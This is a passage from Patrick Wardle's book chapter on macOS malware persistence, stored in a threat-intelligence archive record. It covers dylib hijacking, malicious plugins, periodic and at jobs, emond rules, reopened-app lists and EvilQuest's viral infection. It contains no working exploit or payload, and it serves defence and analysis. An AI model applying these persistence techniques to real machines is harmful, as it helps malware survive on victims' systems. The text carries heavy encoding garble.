â€‹\nblah.dylib does not exist in the applicationâ€™s â€‹ Library/â€‹ directory, and attacker can add a â€‹\nmalicious dylib here (blah.dylibâ€‹ ) which will be automatically loaded at runtime: â€‹\n                    dylib hijacking\nAs noted, this technique requires an application specifically vulnerable to a dylib\nhijack and, for persistence, one that is (ideally) automatically started by macOS. In\nprevious versions of macOS (OS X 10.10), Appleâ€™s PhotoStreamAgentâ€‹ was a perfect candidate â€‹\nas it was both vulnerable to dylib hijacking and automatically started each time the user\nlogged in:\n\n```\n\n-----\n\n```\np. wardle\n\n```\n```\ndylib hijacking Appleâ€™s â€‹PhotoStreamAgent\n\n```\n\nğŸ“ Note:\n```\nTo complement my initial research on dylib hijacking, I released several tools to scan\na macOS system for potentially vulnerable applications:\n\n```\n  - `Dylib Hijack Scanner [26] â€‹`\n\n  - `Dylib Hijack Scanner App [27] â€‹`\n\n```\nThough (publicly known) Mac malware has not been known to leverage this technique in the\nwild, the popular open-source post-exploitation agent EmPyre does have a persistence â€‹\nmodule that leverages dylib hijacking [28]: â€‹\n\n```\n\n-----\n\n```\np. wardle\n\n```\n```\n           Empyreâ€™s dlyib hijacking persistence module [13]\nFor a deeper dive into dylib proxying/hijacking, see:\n\n```\n  - `â€œDylib hijacking on OS Xâ€‹` `â€ [25] â€‹`\n\n  - `â€œMacOS Dylib Injection through Mach-O Binary Manipulationâ€‹` `â€ [29] â€‹`\n\n\nğŸ“ Note:\n```\nAs noted earlier, with the introduction of the hardened runtime in macOS Catalina\n(10.15), Apple has now largely mitigated this persistence mechanism:\n\n```\n\n-----\n\n```\np. wardle\n\n```\n```\nFor more information on Appleâ€™s changes and how 3rd-party applications can protect\nagainst these attacks, see: \n        â€œDYLD_INSERT_LIBRARIES DYLIB injection in macOS / OSXâ€‹ â€ [30] â€‹\nHowever, older versions of applications, or those that have not (yet) opted into the\nhardened runtime, may still be vulnerable to this persistence mechanism. \n\n```\n```\nPlugins\n\n```\n```\nBy design, various Apple daemons and 3rd-party applications support plugins or\nextensions. While plugins can legitimately extend the functionality of a program, malware\nmay abuse such plugin functionality to achieve stealthy persistence within the context of\nthe process. \n\n```\n\nğŸ“ Note:\n```\nAs with other persistence mechanisms that leverage the loading of libraries or other\ncomponents in a process, at process load time, said persistence is only triggered when\nthe target process is started (either automatically or by the user). \nAn added bonus of such persistence is (stealthy) execution within the context of the\ntarget process ...a process which may have access to certain entitlements, devices,\nand/or sensitive resources, access that the malicious code then inherits. \n\n```\n```\nAll modern browsers support plugins (or extensions). In order to target the userâ€™s\nbrowser, malware authors are quite fond of creating malicious browser extensions. Such\nextensions are automatically loaded and executed by the browser each time it is started.\nBesides providing a method of persistence, these malicious plugins also provide direct\naccess to the userâ€™s browsing sessions (to display ads, hijack traffic, extract saved\npasswords and more).\n\n```\n\n-----\n\n```\n                                            p. wardle\nAn example of a malicious browser extension is â€œPitchofcaseâ€. In a comprehensive writeup\nby security researcher Phil Stokes, â€œInside Safari Extensions | Malwareâ€™s Golden Key toâ€‹\nUser Dataâ€â€‹ (2018) [16], itâ€™s noted that:\n   â€œWe recently observed a Safari adware extension called â€œPitchofcaseâ€ which â€‹\n   exhibited several interesting behaviours.\n   At first blush, Pitchofcase seems like any other adware extension: when enabled it\n   redirects user searches through a few pay-for-click addresses before landing on\n   pitchofcase[.]com. The extension runs invisibly in the background without a toolbar\n   button or any other means to interact with it.â€‹â€ [31]\n\n```\n\n-----\n\n```\n                                            p. wardle\n            â€œPitchofcaseâ€ (adware) browser extension [31].\nOf course other applications that support plugins may be similarly subverted. For\nexample, in â€œiTunes Evil Plugin Proof of Conceptâ€‹,â€‹ â€ [32] security researcher Pedro VilaÃ§a\n(@osxreverserâ€‹ )â€‹ previously illustrated how an attacker could coerce iTunes (on OS X 10.9)\nto load a malicious plugin:\n   â€œThe [iTunes] plugin folder is writable by [the] current logged in user so a trojan â€‹\n   dropper can easily load a malicious plugin. Or it can be used as [a] communication\n   channel for a RATâ€ [32]. â€‹\nThough the blog post focused on subverting iTunes in order to steal users credentials,\nthe malicious plugin could also provide persistence (as itâ€™s automatically loaded and\nexecuted each time iTunes is started). \nFinally, various Apple daemons, by design, support 3rd-party plugins. This could\npotentially be leveraged by malicious plugins in order to afford malware stealthy\npersistence (though currently no malware is known to (ab)use these plugins): \nSeveral such daemons and their plugins include:\n\n```\n  - `Authorization Plugins`\n```\n   See: â€œUsing Authorization Plug-insâ€‹ â€â€‹ [33]\n\n```\n  - `Directory ServicesPlugins`\n```\n   See: â€œTwo macOS persistence tricks abusing pluginsâ€‹ â€â€‹ [34]\n\n```\n  - `QuickLook Plugins`\n```\n   See: â€œmacOS persistence - Spotlight importers and how to create themâ€‹ â€â€‹ [35]\n\n```\n  - `Spotlight Importers`\n```\n   See: â€œWriting Bad @$$ Malware for OS Xâ€‹ â€ [36] â€‹\n\n```\n\n-----\n\n```\np. wardle\n\n```\n```\nabusing a spotlight importer (plugin) for persistence\n\n```\n\nğŸ“ Note:\n```\nIn each new release of macOS, Apple continues to limit the impact of plugins (through\nentitlements, code-signing checks and more).\n\n```\n```\nScripts\n\n```\n```\nThere are various legitimate system scripts that Mac malware can surreptitiously modify\nin order to achieve persistence. Though this number is dwindling (goodbye rc.commonâ€‹ !), â€‹\nothers may still afford a means of persistence. \nIn his thorough and comprehensive â€œOS X Incident Responseâ€‹ â€ book [37] from 2016, author â€‹\nJaron Bradley (@jbradley89â€‹ ) discusses persistence via periodic scripts: â€‹\n   â€œAlthough not a highly advanced ASEP [AutoStart Extension Points], periodic is a â€‹\n   one that is less thought of. This persistence mechanism... is set up with folders\n   containing bash scripts to run daily, weekly, or monthly ... at /etc/periodicâ€ â€‹\n   [37]\n\n```\n\n-----\n\n```\n                                            p. wardle\nThough this directory is owned by root, malware with adequate privileges may be able to\ncreate (or subvert) a periodic script in order to achieve persistence at regular\nintervals. \n\n```\n```\n$ ls -lart /etc/periodic/\ndrwxr-xr-x  5 root wheel  160 Aug 24 2019 monthly\ndrwxr-xr-x 11 root wheel  352 Aug 24 2019 daily\ndrwxr-xr-x  3 root wheel  96 Feb 2 22:11 weekly\n\n```\n\nğŸ“ Note:\n```\nThough periodic scripts are (conceptually) rather similar to cron jobs, there are a few\ndifferences, such as the fact that they are handled by a separate daemon:\n                       See: \n     â€œWhat is the difference between â€œperiodicâ€ and â€œcronâ€ on OS X?â€‹ â€â€‹ [38]\n\n```\n```\nBradley also discusses persistence via the atâ€‹ command (in a chapter titled â€œâ€‹ System â€‹\nStartup and Schedulingâ€). [37] â€‹\nSpecifically he states:\n   â€œâ€˜At tasksâ€™ are used to schedule tasks at specified times ...they are one time â€‹\n   tasks ...but will survive a system reboot.â€‹â€ [37] \nSounds perfect for persistence! \n\n```\n\nğŸ“ Note:\n```\nOn a default install of macOS, the at scheduler is disabled, However, with root\nprivileges it can be (re)enabled (e.g. by malware).\n\n```\n```\nTo create an atâ€‹ job, malware (after enabling the â€‹ atâ€‹ scheduler), could simply pipe â€‹\npersistent commands into /usr/bin/atâ€‹ while specifying the time and date of execution. â€‹\nThe /usr/bin/atqâ€‹ utility, as noted in its man page [39], â€œâ€‹ lists the user's pending [at] â€‹\njobs, unless the user is the superuser; in that case, everybody's jobs are listedâ€ â€‹\n\n```\n\n-----\n\n```\n                                            p. wardle\nLegitimate (and/or malicious) atâ€‹ jobs are stored in the â€‹ /private/var/at/jobs/â€‹ directory. â€‹\n\n```\n```\nEvent Monitor Rules\n\n```\n```\nDescribed in Volume I of Jonathan Levinâ€™s *OS Internal book(s) [40], the Event Monitor\ndaemon (emondâ€‹ ) may be (ab)used by malware on macOS to achieve persistence. A 2018 writeup â€‹\ntitled â€œLeveraging Emond on macOS For Persistenceâ€‹ â€â€‹ [41] delves into this more,\nillustrating exactly how itâ€™s accomplished, noting that the â€œrun command [â€‹ emond]â€‹ will â€‹\nexecute any arbitrary system commandâ€. [41] As â€‹ emondâ€‹ is automatically launched by the OS â€‹\nduring system boot, at which time it processes and executes any specified commands,\nmalware can simply create a command for the daemon to automatically execute. \n\n```\n`The MITRE ATT&CK project` `describes persistence via â€‹` `emondâ€‹` â€‹ `as well: â€‹`\n```\n   â€œThe emond binary at /sbin/emond will load any rules from the /etc/emond.d/rules/ â€‹\n   directory and take action once an explicitly defined event takes place. The rule\n   files are in the plist format and define the name, event type, and action to take.\n   Adversaries may abuse this service by writing a rule to execute commands when a\n   defined event occurs, such as system start up or user authentication.â€ [42] â€‹\n\n```\n`Any rules to be persistently executed by emondâ€‹` â€‹ `can be found in the â€‹` `/etc/emond.d/rulesâ€‹` `or â€‹`\n```\n/private/var/db/emondClients directories [43]. â€‹\n\n```\n```\nRe-opened Applications\n\n```\n```\nIn 2014, in my original research paper [1] on the topic of persistence, I noted that\nmalware could (ab)use Appleâ€™s support for â€œreopenedâ€ applications as a means to achieve\nautomatic (re)execution each time the user logs in:\n\n```\n\n-----\n\n```\n                                            p. wardle\n                 reopen applications prompt\nWhen a user logs out, the applications to reopen are stored in a property list named\ncom.apple.loginwindow.<UUID>.plist within the â€‹ ~/Library/Preferences/ByHostâ€‹ directory. â€‹\nViewing the contents of this property list reveals keys, containing values such as: the\nbundle identifier of the application, whether to hide it, and the path to the application\nto (re)launch:\n\n```\n```\n$ plutil -p\n~/Library/Preferences/ByHost/com.apple.loginwindow.151CA171-718D-592B-B37C-ABB9043C4BE\n2.plist\n{\n \"TALAppsToRelaunchAtLogin\" => [\n  0 => {\n   \"BackgroundState\" => 2\n   \"BundleID\" => \"com.apple.ichat\"\n   \"Hide\" => 0\n   \"Path\" => \"/System/Applications/Messages.app\"\n  }\n  1 => {\n   \"BackgroundState\" => 2\n   \"BundleID\" => \"com.google.chrome\"\n   \"Hide\" => 0\n   \"Path\" => \"/Applications/Google Chrome.app\"\n  }\n  ...\n\n```\n```\nTo persist, malware could add itself directly to this property list, and thus be\n(re)executed on the next login. \n\n```\n\n-----\n\n```\np. wardle\n\n```\n```\nApplication/Binary Modification\n\n```\n```\nStealthy malware may achieve persistence by modifying legitimate programs (applications,\nbinaries, etc) found on the infected system. If these programs are then launched, either\nautomatically by the operating system or manually by the user, the malicious code will\nrun.\n\n```\n`In early 2020, security researcher Thomas Reed released a reportâ€‹` â€‹ `[44] that highlighted`\n```\nthe sophistication of adware targeting macOS. \nIn this report, he noted that the prolific adware, Crossriderâ€‹, will subvert Safari in â€‹\norder to persist various (malicious) browser extensions: \n   â€œAs part of this [installation] process, it also makes a copy of Safari that is â€‹\n   modified to automatically enable certain Safari extensions when opened, without\n   user actions required.\n   After this process completes, the copy of Safari is deleted, leaving the real copy\n   of Safari thinking that itâ€™s got a couple additional browser extensions installed\n   and enabled.â€‹â€ [44]\nAnother example, also from early 2020, is OSX.EvilQuestâ€‹ [15]. This malware initially â€‹\npersists as a launch item (com.apple.questd.plistâ€‹ ), but will also virally infect binaries â€‹\non the system. This ensures that even if the launch item is removed, the malware will\nstill retain persistence! As such viral persistence is rarely seen on macOS, letâ€™s take a\ncloser look. \nWhen initially executed OSX.EvilQuestâ€‹, spawns a new background thread to find and infect â€‹\nother binaries. The function responsible for generating a list of candidates is aptly\nnamed get_targetsâ€‹, while the infection function is called â€‹ append_eiâ€‹ : â€‹\n\n```\n|01 02 03 04 05 06 07 08 09 10|ei_loader_thread: 0x000000010000c9a0 push rbp 0x000000010000c9a1 mov rbp, rsp 0x000000010000c9a4 sub rsp, 0x30 0x000000010000c9a8 lea rcx, qword [_is_executable] ... 0x000000010000c9e0 call â€‹get_targets 0x000000010000c9e5 cmp eax, 0x0 0x000000010000c9e8 jne leave ...|\n|---|---|\n\n\n-----\n\n```\n                                            p. wardle\n 11 0x000000010000ca17     mov    rsi, qword [rax] \n 12 0x000000010000ca1a     call    append_ei â€‹\nEach candidate binary, found via the get_targetsâ€‹ function, is passed to the â€‹ append_ei â€‹\nfunction.\nThe append_eiâ€‹ function writes the contents of the malware (i.e. itself) to the start of â€‹\nthe target binary, while (re)writing the original target bytes to the end of the file. It\nthen writes a trailer to the end of the file that includes an infection marker,\n0xDEADFACE, and the offset in the file to the original targetâ€™s bytes. â€‹\nOnce a binary has been infected, since the malware has wholly inserted itself at the\nstart of the file, whenever the file is subsequently executed the malware will be\nexecuted first!\nOf course, to ensure nothing is amiss, the malware also executes the contents of the\noriginal file. This is accomplished by parsing the trailer to get the location of the\nfileâ€™s original bytes. These bytes are then written out to a new file named:\n.<orginalfilename>1, which the malware then executes. â€‹\n\n```\n|11 12|0x000000010000ca17 mov rsi, qword [rax] 0x000000010000ca1a call â€‹append_ei|\n|---|---|\n\n\nğŸ“ Note:\n```\nFor more information on OSX.EvilQuestâ€™s viral infection and persistence capabilities,\nsee: \n      â€œOSX.EvilQuest Uncovered (Part II): Insidious Capabilitiesâ€‹ â€ [45] â€‹\n\n```\n```\n...and more!\n\n```\n```\nAlthough we have covered a myriad of persistence mechanisms that Mac malware can (and\ndoes!) abuse to ensure it is automatically restarted, there are yet other ways.\nHere we provide several other resources that also cover common persistence mechanisms in\ndetail, as well as discuss potential methods yet to be abused:\n\n```\n  - `â€œMethods of Malware Persistence on mac OS Xâ€‹` `â€ [1] â€‹`\n\n  - `â€œHow Malware Persists on macOSâ€‹` `â€â€‹` `[43]`\n\n  - `â€œMITRE ATT&CK: Persistenceâ€‹` `â€ [45] â€‹`\n\n\n-----\n\n```\n                                            p. wardle\nIn volume two, weâ€™ll discuss the detection of Mac malware, including how to\nprogrammatically uncover these persistent mechanisms. However, if youâ€™re interested in\nwhat software (or malware!) is persistently installed on your macOS system, Iâ€™ve created\n\n```\n`a free utility just for this purpose!` `KnockKnockâ€‹` â€‹ `[6] tells you whoâ€™s there by querying`\n```\nyour system for the myriad of persistence mechanisms discussed in this chapter:\n                 KnockKnock? Whoâ€™s There? [6]\n\n```\n```\nUp Next\n\n```\n```\nIn this chapter we discussed numerous persistence mechanisms that macOS malware has\nabused to maintain persistence access to infected systems. And for good measure,\ndiscussed several alternative methods that have yet to be leveraged in the wild for\nmalicious purposes. \nIn the next chapter, weâ€™ll explore the common objectives of malware, once it has\npersistently infected a Mac system.\n\n```\n\n-----\n\n```\n                                            p. wardle\nReferences\n  1. â€œMethods of Malware Persistence on mac OS Xâ€\n   https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf\n  2. â€œDesigning Daemons and Servicesâ€\n   https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSyste\n   mStartup/Chapters/DesigningDaemons.html#//apple_ref/doc/uid/10000172i-SW4-BBCBHBFB\n  3. â€œBlock Blocking Login Itemsâ€\n   https://objective-see.com/blog/blog_0x31.html\n  4. â€œBurned by Fire(fox) part i: a Firefox 0day Drops a macOS Backdoor (OSX.Netwire)â€\n   https://objective-see.com/blog/blog_0x43.html\n  5. â€œMiddle East Cyber-Espionage: Analyzing WindShift's implant: OSX.WindTailâ€\n   https://objective-see.com/blog/blog_0x3B.html\n  6. KnockKnock \n   https://objective-see.com/products/knockknock.html\n  7. â€œAutomatically start app after install in Mac OS El Capitanâ€\n   https://stackoverflow.com/questions/35498192/automatically-start-app-after-install   in-mac-os-el-capitan\n  8. â€œThe Mac Malware of 2019â€\n   https://objective-see.com/blog/blog_0x53.html\n  9. â€œThe Mac Malware of 2019: OSX.CookieMiner\n   https://objective-see.com/blog/blog_0x53.html#osx-cookieminer\n  10. â€œThe Mac Malware of 2019: OSX.Siggen\n   https://objective-see.com/blog/blog_0x53.html#osx-siggen\n  11. â€œBurned by Fire(fox) part iii: a Firefox 0day Drops another macOS backdoor\n   (OSX.Mokes)â€\n   https://objective-see.com/blog/blog_0x45.html\n  12. â€œUnderstanding Appleâ€™s binary property list formatâ€\n   https://medium.com/@karaiskc/understanding-apples-binary-property-list-format-281e6\n   da00dbd\n  13. â€œA Launchd Tutorialâ€\n   https://www.launchd.info/\n\n```\n\n-----\n\n```\n                                          p. wardle\n14. OSX.GMERA (A/B)\n  https://objective-see.com/blog/blog_0x53.html#osx-gmera-a-b\n15. OSX.EvilQuest Uncovered part i: infection, persistence, and more!\n  https://objective-see.com/blog/blog_0x59.html\n16. Cron\n  https://en.wikipedia.org/wiki/Cron\n17. EmPyre: a post-exploitation OS X/Linux agent\n  https://github.com/EmpireProject/EmPyre\n18. â€œNew Mac Malware Janicab Uses Old Trick To Hideâ€\n  https://www.intego.com/mac-security-blog/new-mac-malware-janicab-uses-old-trick-to  hide/\n19. â€œScheduling Jobs With Crontab on macOSâ€\n  https://medium.com/better-programming/https-medium-com-ratik96-scheduling-jobs-with\n  -crontab-on-macos-add5a8b26c30\n20. â€œDynamic Library Programming Topicsâ€\n  https://developer.apple.com/library/archive/documentation/DeveloperTools/Conceptual\n  /DynamicLibraries/000-Introduction/Introduction.html#//apple_ref/doc/uid/TP40001908\n  -SW1\n21. â€œSimple code injection using DYLD_INSERT_LIBRARIESâ€\n  https://blog.timac.org/2012/1218-simple-code-injection-using-dyld_insert_libraries/\n22. â€œTrojan-Downloader:OSX/Flashback.Bâ€\n  https://www.f-secure.com/v-descs/trojan-downloader_osx_flashback_b.shtml\n23. â€œHardened Runtimeâ€\n  https://developer.apple.com/documentation/security/hardened_runtime\n24. â€œThe 'S' in Zoom, Stands for Securityâ€\n  https://objective-see.com/blog/blog_0x56.html\n25. â€œDylib hijacking on OS Xâ€\n  https://www.virusbulletin.com/uploads/pdf/magazine/2015/vb201503-dylib-hijacking.pd\n  f\n26. Dylib Hijack Scanner\n  https://github.com/pandazheng/DylibHijack\n27. Dylib Hijack Scanner App \n  https://objective-see.com/products/dhs.html\n\n```\n\n-----\n\n```\n                                          p. wardle\n28. EmPyre Dylib Hijack Module\n  https://github.com/EmpireProject/EmPyre/blob/master/lib/modules/persistence/osx/Cre\n  ateHijacker.py\n29. â€œMacOS Dylib Injection through Mach-O Binary Manipulationâ€\n  https://malwareunicorn.org/workshops/macos_dylib_injection.html\n30. DYLD_INSERT_LIBRARIES DYLIB injection in macOS / OSX\n  https://theevilbit.github.io/posts/dyld_insert_libraries_dylib_injection_in_macos_o\n  sx_deep_dive/\n31. â€œInside Safari Extensions | Malwareâ€™s Golden Key to User Dataâ€\n  https://www.sentinelone.com/blog/inside-safari-extensions-malware-golden-key-user-d\n  ata/\n32. â€œiTunes Evil Plugin Proof of Conceptâ€\n  https://reverse.put.as/2014/02/15/appledoesntgiveafuckaboutsecurity-itunes-evil-plu\n  gin-proof-of-concept/\n33. â€œUsing Authorization Plug-insâ€\n  https://developer.apple.com/documentation/security/authorization_plug-ins/using_aut\n  horization_plug-ins\n34. â€œTwo macOS persistence tricks abusing pluginsâ€\n  https://medium.com/0xcc/two-macos-persistence-tricks-abusing-plugins-6e55189be49c\n35. â€œmacOS persistence - Spotlight importers and how to create themâ€\n  https://theevilbit.github.io/posts/macos_persistence_spotlight_importers/\n36. â€œWriting Bad @$$ Malware for OS Xâ€\n  https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-Fo\n  r-OS-X.pdf\n37. OS X Incident Response: Scripting and Analysis (J. Bradley)\n  https://www.amazon.com/OS-Incident-Response-Scripting-Analysis-ebook/dp/B01FHOHHVS\n38. â€œWhat is the difference between â€œperiodicâ€ and â€œcronâ€ on OS X?â€\n  https://superuser.com/questions/391204/what-is-the-difference-between-periodic-and  cron-on-os-x\n39. atq \n   x-man-page://atq\n\n```\n\n-----\n\n```\n                                          p. wardle\n40. *OS Internals, Volume I - User Mode\n  http://newosxbook.com/index.php\n41. â€œLeveraging Emond on macOS For Persistenceâ€\n  https://posts.specterops.io/leveraging-emond-on-macos-for-persistence-a040a2785124\n42. â€œMitre ATT&CK: Emondâ€\n  https://attack.mitre.org/techniques/T1519/\n43. â€œHow Malware Persists on macOSâ€\n  https://www.sentinelone.com/blog/how-malware-persists-on-macos/\n44. â€œMac adware is more sophisticated and dangerous than traditional Mac malwareâ€\n  https://blog.malwarebytes.com/mac/2020/02/mac-adware-is-more-sophisticated-dangerou\n  s-than-traditional-mac-malware/\n45. â€œOSX.EvilQuest Uncovered part ii: Insidious Capabilities\n  https://objective-see.com/blog/blog_0x60.html\n46. â€œMITRE ATT&CK: Persistenceâ€\n  https://attack.mitre.org/tactics/TA0003/\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        }
    ],
    "references": [
        "https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf"
    ],
    "report_names": [
        "CH%200x02%20Persistence.pdf"
    ],
    "threat_actors": [
        {
            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
            "created_at": "2022-10-25T16:07:24.471018Z",
            "updated_at": "2025-03-27T02:02:10.24394Z",
            "deleted_at": null,
            "main_name": "Cron",
            "aliases": [],
            "source_name": "ETDA:Cron",
            "tools": [
                "Catelites",
                "Catelites Bot",
                "CronBot",
                "TinyZBot"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "6bd4ed50-e116-494c-bb70-9587876663f1",
            "created_at": "2023-01-06T13:46:39.004062Z",
            "updated_at": "2025-03-27T02:00:02.974882Z",
            "deleted_at": null,
            "main_name": "WindShift",
            "aliases": [
                "Windy Phoenix"
            ],
            "source_name": "MISPGALAXY:WindShift",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ada9e5d3-1cb2-4b70-a3c8-96808c304ac8",
            "created_at": "2022-10-25T15:50:23.6515Z",
            "updated_at": "2025-03-27T02:00:55.513513Z",
            "deleted_at": null,
            "main_name": "Windshift",
            "aliases": [
                "Windshift",
                "Bahamut"
            ],
            "source_name": "MITRE:Windshift",
            "tools": [
                "WindTail"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "68f12936-2361-4720-87e1-b79a4fdbf1a0",
            "created_at": "2022-10-25T16:07:24.409855Z",
            "updated_at": "2025-03-27T02:02:10.21199Z",
            "deleted_at": null,
            "main_name": "WindShift",
            "aliases": [
                "Windy Phoenix"
            ],
            "source_name": "ETDA:WindShift",
            "tools": [
                "WindTail"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716504,
    "ts_updated_at": 1743041479,
    "ts_creation_date": 0,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/b7a30e31147edc126c459afbc50c59cabc8e9836.pdf",
        "text": "https://archive.orkl.eu/b7a30e31147edc126c459afbc50c59cabc8e9836.txt",
        "img": "https://archive.orkl.eu/b7a30e31147edc126c459afbc50c59cabc8e9836.jpg"
    }
}